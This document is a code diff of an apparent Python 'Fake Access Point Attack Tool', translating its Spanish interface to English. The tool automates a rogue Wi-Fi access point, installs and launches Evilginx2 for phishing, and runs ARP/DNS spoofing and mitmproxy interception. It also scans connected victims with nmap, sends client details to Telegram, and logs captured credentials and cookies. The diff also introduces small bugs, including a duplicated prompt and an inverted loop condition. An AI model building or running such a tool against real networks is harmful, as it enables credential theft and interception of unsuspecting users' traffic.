+    print(GREEN + "[+] Installing dependencies for Evilginx2 (golang-go and git)..." + RESET)
     subprocess.run(["sudo", "apt", "install", "-y", "golang-go", "git"], check=True)
     
-    # Clonar o actualizar el repositorio en la versión v3.3.0
+    # Clone or update the repository for version v3.3.0
     if os.path.exists("evilginx2"):
-        print("[+] Actualizando el repositorio de Evilginx2...")
+        print(GREEN + "[+] Updating the Evilginx2 repository..." + RESET)
         os.chdir("evilginx2")
         subprocess.run("git fetch --all", shell=True, check=True)
         subprocess.run("git checkout v3.3.0", shell=True, check=True)
         subprocess.run("git pull origin v3.3.0", shell=True, check=True)
     else:
-        print("[+] Clonando el repositorio de Evilginx2 (v3.3.0)...")
+        print(GREEN + "[+] Cloning the Evilginx2 repository (v3.3.0)..." + RESET)
         subprocess.run("git clone --branch v3.3.0 --depth 1 https://github.com/kgretzky/evilginx2.git", shell=True, check=True)
         os.chdir("evilginx2")
     
-    print("[+] Compilando Evilginx2...")
+    print(GREEN + "[+] Compiling Evilginx2..." + RESET)
     subprocess.run("make clean && make", shell=True, check=True)
     
-    # Buscar el binario en rutas conocidas
+    # Search for the binary in known locations
     binary_path = None
-    posibles_rutas = [
+    possible_paths = [
         "evilginx2", 
         "evilginx", 
         os.path.join("build", "evilginx2"), 
         os.path.join("build", "evilginx")
     ]
-    for path in posibles_rutas:
+    for path in possible_paths:
         if os.path.exists(path) and os.access(path, os.X_OK):
             binary_path = path
             break
 
     if not binary_path:
-        print("[-] No se encontró el binario de Evilginx2. Verifique la compilación.")
+        print(RED + "[-] Evilginx2 binary not found. Please check the compilation." + RESET)
         return
 
-    print(f"[+] Se encontró el binario en: {binary_path}")
-    print("[+] Instalando Evilginx2 en /usr/local/bin/evilginx2...")
+    print(GREEN + f"[+] Found binary at: {binary_path}" + RESET)
+    print(GREEN + "[+] Installing Evilginx2 to /usr/local/bin/evilginx2..." + RESET)
     subprocess.run(f"sudo cp {binary_path} /usr/local/bin/evilginx2", shell=True, check=True)
     
     os.chdir("..")
-    print("[+] Instalación de Evilginx2 completada.")
+    print(GREEN + "[+] Evilginx2 installation complete." + RESET)
 
 
-        
-        
 def start_advanced_mitm_attack():
+    # Prompt for the domain (optional)
+    domain = input(YELLOW + "Enter the domain (optional) to configure in Evilginx2: " + RESET).strip()
+    # Prompt for the external IP (optional)
+    external_ip = input(YELLOW + "Enter the external IP (optional) of this server: " + RESET).strip()
 
-
-    # Solicitar el dominio (opcional)
-    domain = input("Ingrese el dominio (opcional) a configurar en Evilginx2: ").strip()
-    # Solicitar la IP externa (opcional)
-    external_ip = input("Ingrese la IP externa (opcional) de este servidor: ").strip()
-
-    # Solicitar la ruta del directorio de phishlets (esencial)
-    phishlets_path = input("Ingrese la ruta del directorio de phishlets de Evilginx2 (por defecto /etc/evilginx2/phishlets): ").strip()
+    # Prompt for the phishlets directory path (required)
+    phishlets_path = input(YELLOW + "Enter the Evilginx2 phishlets directory path (default /etc/evilginx2/phishlets): " + RESET).strip()
     if not phishlets_path:
         phishlets_path = "/etc/evilginx2/phishlets"
-        print("[+] Usando ruta por defecto para phishlets:", phishlets_path)
-    # Verificar que el directorio de phishlets exista
+        print(GREEN + "[+] Using default phishlets path:" + RESET, phishlets_path)
+    # Verify that the phishlets directory exists
     if not os.path.isdir(phishlets_path):
-        print("[-] El directorio de phishlets no existe: " + phishlets_path)
+        print(RED + "[-] The phishlets directory does not exist: " + phishlets_path + RESET)
         return
 
-    # Solicitar la ruta del directorio de configuración (opcional)
-    config_path = input("Ingrese la ruta del directorio de configuración de Evilginx2 (opcional): ").strip()
+    # Prompt for the configuration directory path (optional)
+    config_path = input(YELLOW + "Enter the Evilginx2 configuration directory path (optional): " + RESET).strip()
 
-    print("\n[+] Instrucciones para la shell interactiva de Evilginx2:")
+    print(GREEN + "\n[+] Instructions for the Evilginx2 interactive shell:" + RESET)
     if domain:
-        print("    - Agregar el dominio con: config domain " + domain)
+        print(CYAN + "    - Add the domain with: config domain " + domain + RESET)
     if external_ip:
-        print("    - Configurar la IP externa con: config ipv4 external " + external_ip)
-    print("    - Verifique que los phishlets estén correctamente ubicados en: " + phishlets_path)
-    print("\n[+] Iniciando Evilginx2 en una nueva ventana de terminal...\n")
+        print(CYAN + "    - Configure the external IP with: config ipv4 external " + external_ip + RESET)
+    print(CYAN + "    - Ensure that the phishlets are correctly located at: " + phishlets_path + RESET)
+    print(CYAN + "\n[+] Starting Evilginx2 in a new terminal window...\n" + RESET)
 
     try:
-        # Construir el comando: se incluye -c solo si se proporcionó config_path
+        # Build the command: include -c only if config_path is provided
         if config_path:
             cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -c {config_path} -p {phishlets_path}; exec bash'"
         else:
             cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -p {phishlets_path}; exec bash'"
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para detener Evilginx2...")
+        input(YELLOW + "Press ENTER to stop Evilginx2..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("[+] Evilginx2 detenido.")
+        print(GREEN + "[+] Evilginx2 stopped." + RESET)
     except Exception as e:
-        print("[-] Error al iniciar Evilginx2:", e)
-
+        print(RED + "[-] Error starting Evilginx2:" + str(e) + RESET)
 
 
 def start_mitm_menu():
     while True:
-        print("""
-Seleccione el tipo de ataque MITM:
+        print(BLUE + """
+Select the type of MITM attack:
   1) ARP Spoofing (Bettercap)
-  2) DNS Spoofing (Ettercap, modo GUI con caplet)
+  2) DNS Spoofing (Ettercap, GUI mode with caplet)
   3) Proxy MITM (mitmproxy)
-  4) Ataque MITM avanzado (Evilginx2)
-  5) Volver al menú principal
-""")
-        opcion = input("Ingrese la opción: ").strip()
-        if opcion == "1":
+  4) Advanced MITM Attack (Evilginx2)
+  5) Back to Main Menu
+""" + RESET)
+        option = input(YELLOW + "Enter your choice: " + RESET).strip()
+        if option == "1":
             start_mitm_attack()
-        elif opcion == "2":
+        elif option == "2":
             start_dns_spoof_attack()
-        elif opcion == "3":
+        elif option == "3":
             start_proxy_mitm_attack()
-        elif opcion == "4":
+        elif option == "4":
             start_advanced_mitm_attack()
-        elif opcion == "5":
+        elif option == "5":
             break
         else:
-            print("[-] Opción inválida, intente de nuevo.\n")       
-        
-        
-def escanear_vulnerabilidades():
+            print(RED + "[-] Invalid option, please try again.\n" + RESET)
+
+
+def scan_vulnerabilities():
     import subprocess
 
-    # Definir las categorías NSE disponibles
+    # Define available NSE categories
     available_categories = {
         "1": "auth",
         "2": "broadcast",
@@ -1214,14 +1266,15 @@ def escanear_vulnerabilidades():
         "12": "vuln"
     }
     
-    print("\n[Escaneo de Vulnerabilidades Personalizado]")
-    print("Seleccione las categorías NSE que desea incluir en el escaneo:")
+    print(BLUE + "\n[Custom Vulnerability Scan]" + RESET)
+    print(GREEN + "Select the NSE categories to include in the scan:" + RESET)
     for num, cat in sorted(available_categories.items(), key=lambda x: int(x[0])):
-        print(f"  {num}) {cat}")
+        print(CYAN + f"  {num}) {cat}" + RESET)
 
-    print("\n[Advertencia]")
-    print("Un escaneo con muchas categorías puede aumentar considerablemente el tiempo de escaneo, incluso afectar la estabilidad del host objetivo.")
-    input_categories = input("Ingrese los números separados por comas (por defecto 3,12): ").strip()
+    print(YELLOW + "\n[Warning]" + RESET)
+    print(YELLOW + "A scan with many categories can significantly increase the scan time and even affect the stability of the target host." + RESET)
+    input(YELLOW + "Enter the numbers separated by commas (default 3,12): " + RESET)
+    input_categories = input(YELLOW + "Enter the numbers separated by commas (default 3,12): " + RESET).strip()
     if not input_categories:
         selected = ["default", "vuln"]
     else:
@@ -1230,77 +1283,77 @@ def escanear_vulnerabilidades():
         if not selected:
             selected = ["default", "vuln"]
     categories_str = ",".join(selected)
-    print(f"[+] Se seleccionaron las categorías: {categories_str}")
+    print(GREEN + f"[+] Selected categories: {categories_str}" + RESET)
     
-    # Para cada categoría seleccionada, preguntar si se desean agregar argumentos
-    print("\n[Información]")
-    print("Para cada categoría, puede ingresar argumentos adicionales en formato key=value, separados por comas. Ejemplo: vulns.showall=1, auth.timeout=5")
-    print("Consulte la documentación NSE en: https://nmap.org/nsedoc/ para más detalles.\n")
+    # For each selected category, ask for additional arguments
+    print(CYAN + "\n[Info]" + RESET)
+    print(CYAN + "For each category, you may enter additional arguments in key=value format, separated by commas. Example: vulns.showall=1, auth.timeout=5" + RESET)
+    print(CYAN + "Refer to the NSE documentation at: https://nmap.org/nsedoc/ for more details." + RESET)
     script_args_list = []
     for cat in selected:
-        default_prompt = " (por defecto: vulns.showall=1)" if cat == "vuln" else ""
-        user_args = input(f"Ingrese argumentos para la categoría '{cat}'{default_prompt} (o presione Enter para omitir): ").strip()
+        default_prompt = " (default: vulns.showall=1)" if cat == "vuln" else ""
+        user_args = input(YELLOW + f"Enter arguments for category '{cat}'{default_prompt} (or press Enter to skip): " + RESET).strip()
         if not user_args and cat == "vuln":
             user_args = "vulns.showall=1"
         if user_args:
             script_args_list.append(user_args)
     script_args_str = ",".join(script_args_list)
-    print(f"[+] Se usarán los siguientes argumentos NSE: {script_args_str}")
+    print(GREEN + f"[+] The following NSE arguments will be used: {script_args_str}" + RESET)
     
-    # Obtener dispositivos conectados (se supone que get_connected_stations() está definida en tu script)
+    # Get connected devices (assuming get_connected_stations() is defined)
     devices = get_connected_stations()
     if not devices:
-        print("[-] No se encontraron dispositivos conectados.")
+        print(RED + "[-] No connected devices found." + RESET)
         return
 
-    print("\n[+] Dispositivos conectados:")
+    print(GREEN + "\n[+] Connected devices:" + RESET)
     for idx, dev in enumerate(devices, start=1):
         ip = dev.get("IP", "N/A")
         mac = dev.get("MAC", "N/A")
         hostname = dev.get("hostname", "N/A")
-        print(f"  [{idx}] IP: {ip} | MAC: {mac} | Hostname: {hostname}")
+        print(CYAN + f"  [{idx}] IP: {ip} | MAC: {mac} | Hostname: {hostname}" + RESET)
 
     try:
-        choice = int(input("\nSeleccione el dispositivo a escanear (por número): ").strip())
+        choice = int(input(YELLOW + "\nSelect the device to scan (by number): " + RESET).strip())
         target = devices[choice - 1].get("IP")
         if not target:
-            print("[-] El dispositivo seleccionado no tiene una IP válida.")
+            print(RED + "[-] The selected device does not have a valid IP." + RESET)
             return
     except Exception as e:
-        print("[-] Selección inválida:", e)
+        print(RED + "[-] Invalid selection:" + str(e) + RESET)
         return
 
-    use_pn = input("¿Desea usar la opción -Pn para omitir el ping scan? (s/n, por defecto s): ").strip().lower()
+    use_pn = input(YELLOW + "Do you want to use the -Pn option to skip ping scan? (y/n, default y): " + RESET).strip().lower()
     pn_flag = "-Pn" if use_pn != "n" else ""
 
-    print(f"\n[+] Ejecutando escaneo de vulnerabilidades en {target} usando nmap...")
-    # Construir el comando nmap con las categorías y argumentos seleccionados
+    print(GREEN + f"\n[+] Running vulnerability scan on {target} using nmap..." + RESET)
+    # Build the nmap command with the selected categories and arguments
     nmap_cmd = f"sudo nmap {pn_flag} -sV -O --script \"{categories_str}\" --script-args \"{script_args_str}\" {target}"
     try:
         result = subprocess.run(nmap_cmd, shell=True, capture_output=True, text=True)
-        print("[+] Resultado del escaneo:")
+        print(GREEN + "[+] Scan result:" + RESET)
         print(result.stdout)
         if result.stderr:
-            print("\n[!] Errores durante el escaneo:")
+            print(YELLOW + "\n[!] Errors during the scan:" + RESET)
             print(result.stderr)
     except Exception as e:
-        print("[-] Error al ejecutar nmap:", e)
+        print(RED + "[-] Error executing nmap:" + str(e) + RESET)
 
 
-def generar_reporte():
+def generate_report():
     import csv
     import datetime
     import os
 
-    print("\n[GENERAR REPORTE]")
-    attack_type = input("Ingrese el tipo de ataque (ej: Fake AP, MITM, etc.): ").strip()
-    description = input("Ingrese una descripción breve del ataque: ").strip()
-    result = input("Ingrese el resultado obtenido (credenciales, cookies, etc.): ").strip()
+    print(GREEN + "\n[GENERATE REPORT]" + RESET)
+    attack_type = input(YELLOW + "Enter the type of attack (e.g., Fake AP, MITM, etc.): " + RESET).strip()
+    description = input(YELLOW + "Enter a brief description of the attack: " + RESET).strip()
+    result = input(YELLOW + "Enter the result obtained (credentials, cookies, etc.): " + RESET).strip()
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    filename = input("Ingrese el nombre del reporte (sin extensión, se usará .csv): ").strip()
+    filename = input(YELLOW + "Enter the report file name (without extension, .csv will be used): " + RESET).strip()
     if not filename:
-        filename = "reporte"
+        filename = "report"
     filename = filename + ".csv"
     
     file_exists = os.path.isfile(filename)
@@ -1310,97 +1363,97 @@ def generar_reporte():
             if not file_exists:
                 writer.writerow(["Timestamp", "Attack Type", "Description", "Result"])
             writer.writerow([timestamp, attack_type, description, result])
-        print(f"[+] Reporte generado y guardado en {filename}\n")
+        print(GREEN + f"[+] Report generated and saved in {filename}\n" + RESET)
     except Exception as e:
-        print("[-] Error al generar el reporte:", e)
+        print(RED + "[-] Error generating report:" + str(e) + RESET)
 
 
-def analizar_reporte():
+def analyze_report():
     import csv
     import os
 
-    print("\n[ANALIZAR REPORTE]")
-    filename = input("Ingrese el nombre del reporte CSV a analizar (con .csv): ").strip()
+    print(GREEN + "\n[ANALYZE REPORT]" + RESET)
+    filename = input(YELLOW + "Enter the CSV report file name to analyze (with .csv extension): " + RESET).strip()
     if not os.path.isfile(filename):
-        print("[-] El archivo no existe.\n")
+        print(RED + "[-] File does not exist.\n" + RESET)
         return
     
     try:
         with open(filename, 'r', newline='') as file:
             reader = csv.DictReader(file)
             rows = list(reader)
-            print(f"[+] Se encontraron {len(rows)} registros en {filename}.\n")
+            print(GREEN + f"[+] Found {len(rows)} records in {filename}.\n" + RESET)
             for idx, row in enumerate(rows, start=1):
-                print(f"Registro {idx}: {row}")
+                print(CYAN + f"Record {idx}: {row}" + RESET)
             print("")
     except Exception as e:
-        print("[-] Error al analizar el reporte:", e)
+        print(RED + "[-] Error analyzing report:" + str(e) + RESET)
 
 
-def reportes_menu():
+def reports_menu():
     while True:
-        print("""
-[REPORTES]
-  1) Generar reporte
-  2) Analizar reporte
-  3) Volver al menú principal
-        """)
-        opcion = input("Seleccione una opción: ").strip()
-        if opcion == "1":
-            generar_reporte()
-        elif opcion == "2":
-            analizar_reporte()
-        elif opcion == "3":
+        print(BLUE + """
+[REPORTS]
+  1) Generate Report
+  2) Analyze Report
+  3) Back to Main Menu
+""" + RESET)
+        option = input(YELLOW + "Select an option: " + RESET).strip()
+        if option == "1":
+            generate_report()
+        elif option == "2":
+            analyze_report()
+        elif option == "3":
             break
         else:
-            print("[-] Opción inválida, intente de nuevo.\n")
+            print(RED + "[-] Invalid option, please try again.\n" + RESET)
 
 
-
-def instalar_requests():
+def install_requests():
     import sys, subprocess
     try:
         import requests
     except ImportError:
-        print("[+] Instalando requests...")
+        print(GREEN + "[+] Installing requests..." + RESET)
         result = subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True, text=True)
         if result.returncode != 0:
-            print("[-] Error al instalar requests:", result.stderr)
+            print(RED + "[-] Error installing requests:" + result.stderr + RESET)
             return False
     return True
 
-def start_notificaciones_telegram():
+
+def start_telegram_notifications():
     import time
     try:
         import requests
     except ImportError:
-        if not instalar_requests():
-            print("[-] No se pudo instalar requests. Abortando notificaciones.")
+        if not install_requests():
+            print(RED + "[-] Could not install requests. Aborting notifications." + RESET)
             return
         import requests
 
-    global notificaciones_thread, notificaciones_stop_event
+    global notifications_thread, notifications_stop_event
 
-    print("\n[Notificaciones en Tiempo Real - Telegram para Clientes Conectados]")
-    bot_token = input("Ingrese el token del bot de Telegram: ").strip()
-    chat_id = input("Ingrese el chat ID: ").strip()
+    print(GREEN + "\n[Real-Time Telegram Notifications for Connected Clients]" + RESET)
+    bot_token = input(YELLOW + "Enter the Telegram bot token: " + RESET).strip()
+    chat_id = input(YELLOW + "Enter the chat ID: " + RESET).strip()
     if not bot_token or not chat_id:
-        print("[-] Token y chat ID son requeridos. Abortando notificaciones.")
+        print(RED + "[-] Bot token and chat ID are required. Aborting notifications." + RESET)
         return
 
-    # Si ya hay notificaciones corriendo, avisar y salir
-    if notificaciones_thread is not None and notificaciones_thread.is_alive():
-        print("[*] Las notificaciones ya están en ejecución.")
+    # If notifications are already running, inform and exit.
+    if notifications_thread is not None and notifications_thread.is_alive():
+        print(CYAN + "[*] Notifications are already running." + RESET)
         return
 
-    notificaciones_stop_event = threading.Event()
+    notifications_stop_event = threading.Event()
 
     def background_notifications():
         previous_msg = None
-        while not notificaciones_stop_event.is_set():
-            # Obtener la lista actual de clientes conectados
-            clients = get_connected_stations()  # Asume que esta función ya está definida globalmente
-            msg = "[Notificaciones Clientes Conectados]\n"
+        while not notifications_stop_event.is_set():
+            # Get the current list of connected clients (assumes get_connected_stations() is defined)
+            clients = get_connected_stations()
+            msg = "[Connected Clients Notifications]\n"
             if clients:
                 for client in clients:
                     mac = client.get("MAC", "N/A")
@@ -1408,256 +1461,262 @@ def start_notificaciones_telegram():
                     hostname = client.get("hostname", "N/A")
                     msg += f"MAC: {mac} | IP: {ip} | Hostname: {hostname}\n"
             else:
-                msg += "No hay clientes conectados.\n"
-            # Enviar notificación solo si el mensaje cambió
+                msg += "No clients connected.\n"
+            # Send a notification only if the message has changed
             if msg != previous_msg:
                 url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                 data = {"chat_id": chat_id, "text": msg}
                 try:
                     response = requests.post(url, data=data)
                     if response.status_code == 200:
-                        print("[+] Notificación enviada.")
+                        print(GREEN + "[+] Notification sent." + RESET)
                     else:
-                        print("[-] Error al enviar notificación:", response.text)
+                        print(RED + "[-] Error sending notification:" + response.text + RESET)
                 except Exception as e:
-                    print("[-] Excepción al enviar notificación:", e)
+                    print(RED + "[-] Exception sending notification:" + str(e) + RESET)
                 previous_msg = msg
-            # Esperar 10 segundos (se interrumpe antes si se solicita)
+            # Wait 10 seconds (break early if requested)
             for _ in range(10):
-                if notificaciones_stop_event.is_set():
+                if not notifications_stop_event.is_set():
                     time.sleep(1)
                 else:
                     break
 
-    notificaciones_thread = threading.Thread(target=background_notifications, daemon=True)
-    notificaciones_thread.start()
-    print("[+] Notificaciones iniciadas en segundo plano.\n")
+    notifications_thread = threading.Thread(target=background_notifications, daemon=True)
+    notifications_thread.start()
+    print(GREEN + "[+] Notifications started in the background.\n" + RESET)
     
-def stop_notificaciones_telegram():
-    global notificaciones_stop_event, notificaciones_thread
-    if notificaciones_thread is not None and notificaciones_thread.is_alive():
-        print("[+] Deteniendo notificaciones en segundo plano...")
-        notificaciones_stop_event.set()
-        notificaciones_thread.join(timeout=5)
-        print("[+] Notificaciones detenidas.\n")
-    else:
-        print("[*] No hay notificaciones en ejecución.\n")
 
-def menu_notificaciones():
+def stop_telegram_notifications():
+    global notifications_stop_event, notifications_thread
+    if notifications_thread is not None and notifications_thread.is_alive():
+        print(GREEN + "[+] Stopping background notifications..." + RESET)
+        notifications_stop_event.set()
+        notifications_thread.join(timeout=5)
+        print(GREEN + "[+] Notifications stopped.\n" + RESET)
+    else:
+        print(CYAN + "[*] No notifications are running.\n" + RESET)
+
+
+def notifications_menu():
     while True:
-        print("""
-[NOTIFICACIONES TELEGRAM]
-  1) Iniciar Notificaciones
-  2) Detener Notificaciones
-  3) Volver al Menú Principal
-        """)
-        opcion = input("Seleccione una opción: ").strip()
-        if opcion == "1":
-            start_notificaciones_telegram()
-        elif opcion == "2":
-            stop_notificaciones_telegram()
-        elif opcion == "3":
+        print(BLUE + """
+[TELEGRAM NOTIFICATIONS]
+  1) Start Notifications
+  2) Stop Notifications
+  3) Back to Main Menu
+""" + RESET)
+        option = input(YELLOW + "Select an option: " + RESET).strip()
+        if option == "1":
+            start_telegram_notifications()
+        elif option == "2":
+            stop_telegram_notifications()
+        elif option == "3":
             break
         else:
-            print("[-] Opción inválida, intente de nuevo.")
-            
-            
-def automatizar_configuracion_red():
-    print("[+] Iniciando Automatización de Configuración de Red...")
-    interface = seleccionar_interfaz()
+            print(RED + "[-] Invalid option, please try again." + RESET)
+
+
+def automate_network_configuration():
+    print(GREEN + "[+] Starting automated network configuration..." + RESET)
+    interface = select_interface()
     if not interface:
-        print("[-] No se encontró una interfaz para configurar la red.")
+        print(RED + "[-] No interface found for network configuration." + RESET)
         return
 
-    # Resetear la interfaz y desactivar servicios en conflicto
-    resetear_interfaz(interface)
+    # Reset the interface and disable conflicting services
+    reset_interface(interface)
     
-    # Configurar la interfaz en modo AP
-    ap_interface = habilitar_modo_ap(interface)
+    # Configure the interface in AP mode
+    ap_interface = enable_ap_mode(interface)
     
-    # Asignar una IP estática (por ejemplo, 192.168.1.1/24)
-    configurar_red(ap_interface)
+    # Assign a static IP (e.g., 192.168.1.1/24)
+    configure_network(ap_interface)
     
-    # Configurar dnsmasq con rango DHCP y tiempo de lease (ajusta según tus necesidades)
-    configurar_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
+    # Configure dnsmasq with DHCP range and lease time (adjust as needed)
+    configure_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
     
-    # Iniciar hostapd para que se levante el AP
-    iniciar_hostapd()
+    # Start hostapd to bring up the AP
+    start_hostapd()
     
-    # Habilitar NAT para proveer conectividad a Internet a los clientes conectados
-    habilitar_nat()
+    # Enable NAT to provide Internet connectivity to connected clients
+    enable_nat()
     
-    print("[+] Automatización de Configuración de Red completada.\n")         
-    
-    
-def restaurar_configuracion_red():
-    import subprocess
-    print("[+] Restaurando configuración de red y deteniendo el ataque...")
+    print(GREEN + "[+] Automated network configuration completed.\n" + RESET)
 
-    # Detener servicios críticos
+
+def restore_network_configuration():
+    import subprocess
+    print(GREEN + "[+] Restoring network configuration and stopping the attack..." + RESET)
+
+    # Stop critical services
     subprocess.run("sudo systemctl stop hostapd", shell=True, check=False)
     subprocess.run("sudo systemctl stop dnsmasq", shell=True, check=False)
     subprocess.run("sudo killall -9 wpa_supplicant hostapd dnsmasq", shell=True, check=False)
     
-    # Vaciar reglas de iptables (tabla NAT)
+    # Flush the NAT table in iptables
     subprocess.run("sudo iptables -t nat -F", shell=True, check=False)
     
-    # Restaurar las interfaces inalámbricas a modo Managed
-    interfaces = listar_interfaces()
+    # Restore wireless interfaces to Managed mode
+    interfaces = list_interfaces()
     if interfaces:
         for iface in interfaces:
-            print(f"[+] Restaurando la interfaz {iface} a modo Managed...")
+            print(GREEN + f"[+] Restoring interface {iface} to Managed mode..." + RESET)
             subprocess.run(f"sudo nmcli device set {iface} managed yes", shell=True, check=False)
             subprocess.run(f"sudo ip link set {iface} down", shell=True, check=False)
             subprocess.run(f"sudo iw dev {iface} set type managed", shell=True, check=False)
             subprocess.run(f"sudo ip link set {iface} up", shell=True, check=False)
     else:
-        print("[-] No se encontraron interfaces inalámbricas para restaurar.")
+        print(RED + "[-] No wireless interfaces found to restore." + RESET)
     
-    # Reiniciar el Network Manager (opcional)
+    # Optionally restart the Network Manager
     subprocess.run("sudo systemctl restart NetworkManager", shell=True, check=False)
-    print("[+] Configuración de red restaurada. Ataque detenido.\n")       
+    print(GREEN + "[+] Network configuration restored. Attack stopped.\n" + RESET)
 
 
-def ayuda_documentacion():
-    print("""
+def help_documentation():
+    print(BLUE + """
 ==============================
-       AYUDA Y DOCUMENTACIÓN
+       HELP & DOCUMENTATION
 ==============================
 
-Esta herramienta de ataque de AP Fake integra las siguientes funcionalidades:
+This Fake AP attack tool integrates the following functionalities:
 
-1) Crear Fake AP:
-   - Configura un punto de acceso falso (Fake AP) utilizando hostapd, dnsmasq y NAT.
-   - Documentación:
+1) Create Fake AP:
+   - Sets up a fake access point (Fake AP) using hostapd, dnsmasq, and NAT.
+   - Documentation:
        - Hostapd: https://w1.fi/hostapd/
        - Dnsmasq: http://www.thekelleys.org.uk/dnsmasq/doc.html
 
-2) Ataque MITM:
-   - Permite realizar ataques Man-In-The-Middle con Bettercap, DNS spoofing con Ettercap, y Proxy MITM con mitmproxy.
-   - Documentación:
+2) MITM Attack:
+   - Allows performing Man-In-The-Middle attacks with Bettercap, DNS spoofing with Ettercap, and Proxy MITM with mitmproxy.
+   - Documentation:
        - Bettercap: https://www.bettercap.org/
        - Ettercap: https://ettercap.github.io/ettercap/
        - Mitmproxy: https://mitmproxy.org/
        - Evilginx2: https://github.com/kgretzky/evilginx2
 
-3) Portal de Phishing (Wifiphisher):
-   - Despliega escenarios de phishing para obtener credenciales y datos sensibles.
-   - Documentación: https://wifiphisher.org/
+3) Phishing Portal (Wifiphisher):
+   - Launches phishing scenarios to capture credentials and sensitive data.
+   - Documentation: https://wifiphisher.org/
 
-4) Sniffing, Inyección y Manipulación de paquetes:
-   - Permite capturar tráfico pasivo e interactuar con Scapy para análisis, inyección y manipulación de paquetes.
-   - Documentación:
+4) Sniffing, Packet Injection and Manipulation:
+   - Enables passive traffic capture and interaction with Scapy for analysis, injection, and packet manipulation.
+   - Documentation:
        - Tcpdump: https://www.tcpdump.org/
        - Scapy: https://scapy.readthedocs.io/en/latest/usage.html
 
-5) Escaneo de Vulnerabilidades:
-   - Utiliza Nmap con scripts NSE para detectar vulnerabilidades en dispositivos conectados.
-   - Documentación:
+5) Vulnerability Scanning:
+   - Uses Nmap with NSE scripts to detect vulnerabilities in connected devices.
+   - Documentation:
        - Nmap NSE: https://nmap.org/nsedoc/
        - Nmap: https://nmap.org/
 
-6) Monitorear clientes conectados:
-   - Muestra en tiempo real los dispositivos conectados al Fake AP.
+6) Monitor Connected Clients:
+   - Displays in real-time the devices connected to the Fake AP.
    
-7) Notificaciones en Tiempo Real (Telegram):
-   - Envía notificaciones sobre dispositivos conectados mediante un bot de Telegram.
-   - Documentación:
-       - API de Telegram Bots: https://core.telegram.org/bots/api
+7) Real-Time Notifications (Telegram):
+   - Sends notifications about connected devices via a Telegram bot.
+   - Documentation:
+       - Telegram Bots API: https://core.telegram.org/bots/api
 
-8) Generación y Análisis de Reportes:
-   - Permite generar reportes en formato CSV y analizarlos posteriormente.
+8) Report Generation and Analysis:
+   - Allows generating CSV reports and analyzing them later.
 
-9) Restaurar Configuración de Red:
-   - Detiene las herramientas de ataque y restaura la red a su estado original (hostapd, dnsmasq, iptables, etc.).
+9) Restore Network Configuration:
+   - Stops the attack tools and restores the network to its original state (hostapd, dnsmasq, iptables, etc.).
 
-Para más detalles y ejemplos de uso, consulte la documentación oficial de cada herramienta en los enlaces proporcionados.
+For more details and usage examples, refer to the official documentation of each tool using the provided links.
 
-Presione ENTER para volver al menú principal...
-""")
+Press ENTER to return to the main menu...
+""" + RESET)
     input()
 
 
 def banner():
-    print("""
+    print(BLUE + """
     ==============================
     FAKE ACCESS POINT ATTACK TOOL
     ==============================
-    [1] Crear Fake AP
-    [2] Ataque MITM
-    [3] Portal de Phishing
-    [4] Sniffing e Inyeccion
-    [5] Scaneo de Vulnerabilidades en Dispositivos Conectados    
-    [6] Monitorear clientes conectados
-    [7] Notificaciones en Tiempo Real        
-    [8] Generación y Análisis de Reportes
-    [9] Restaurar Configuración de Red
-    [10] Ayuda y Dumentacion
-    [11] Salir
-    """)        
+    [1] Create Fake AP
+    [2] MITM Attack
+    [3] Phishing Portal
+    [4] Sniffing and Injection
+    [5] Vulnerability Scan on Connected Devices    
+    [6] Monitor Connected Clients
+    [7] Real-Time Notifications        
+    [8] Generate and Analyze Reports
+    [9] Restore Network Configuration
+    [10] Help & Documentation
+    [11] Exit
+    """ + RESET)
+
 
 def main():
-    # Comprobando entorno virtual.
-    crear_entorno_virtual()
+    # Check for updates
+    check_for_updates()
+    # Check for virtual environment.
+    create_virtual_environment()
     global ap_interface_global
-    instalar_dependencias()
+    install_dependencies()
     while True:
         banner()
-        opcion = input("Selecciona una opción: ")
-        if opcion == "1":
-            menu_configuracion_red()
-        elif opcion == "2":
-            start_mitm_menu()   # Llamamos al submenú de ataques MITM
-        elif opcion == "3":
+        option = input(YELLOW + "Select an option: " + RESET)
+        if option == "1":
+            network_configuration_menu()
+        elif option == "2":
+            start_mitm_menu()   # Call the MITM attacks submenu
+        elif option == "3":
             start_phishing_portal()
-        elif opcion == "4":
+        elif option == "4":
             sniffing_menu()
-        elif opcion == "5":
-            escanear_vulnerabilidades()
-        elif opcion == "6":
-            monitorear_clientes()
-        elif opcion == "7":
-            menu_notificaciones()
-        elif opcion == "8":
-            reportes_menu()
-        elif opcion == "9":
-            restaurar_configuracion_red()
-        elif opcion == "10":
-            ayuda_documentacion()
-        elif opcion == "11":
-            print("[+] Saliendo...")
+        elif option == "5":
+            scan_vulnerabilities()
+        elif option == "6":
+            monitor_clients()
+        elif option == "7":
+            notifications_menu()
+        elif option == "8":
+            reports_menu()
+        elif option == "9":
+            restore_network_configuration()
+        elif option == "10":
+            help_documentation()
+        elif option == "11":
+            print(GREEN + "[+] Exiting..." + RESET)
             if ap_interface_global:
-                recuperar_interfaz(ap_interface_global)
+                recover_interface(ap_interface_global)
             try:
                 subprocess.run("sudo iptables -t nat -F", shell=True, check=True)
-                print("[+] Configuración de iptables restaurada.")
+                print(GREEN + "[+] iptables configuration restored." + RESET)
             except Exception as e:
-                print("Error al limpiar iptables:", e)
+                print(RED + "Error cleaning iptables:" + str(e) + RESET)
             
-            # Restaurar configuraciones de Ettercap solo si existen los backups
+            # Restore Ettercap configurations if backups exist
             if os.path.exists("/etc/ettercap/etter.conf.bak"):
                 subprocess.run("sudo mv /etc/ettercap/etter.conf.bak /etc/ettercap/etter.conf", shell=True, check=False)
-                print("[+] Configuración de Ettercap restaurada.")
+                print(GREEN + "[+] Ettercap configuration restored." + RESET)
             else:
-                print("[+] No se encontró backup de /etc/ettercap/etter.conf, se omite restauración.")
+                print(CYAN + "[+] No backup of /etc/ettercap/etter.conf found, skipping restoration." + RESET)
             
             if os.path.exists("/etc/ettercap/etter.dns.bak"):
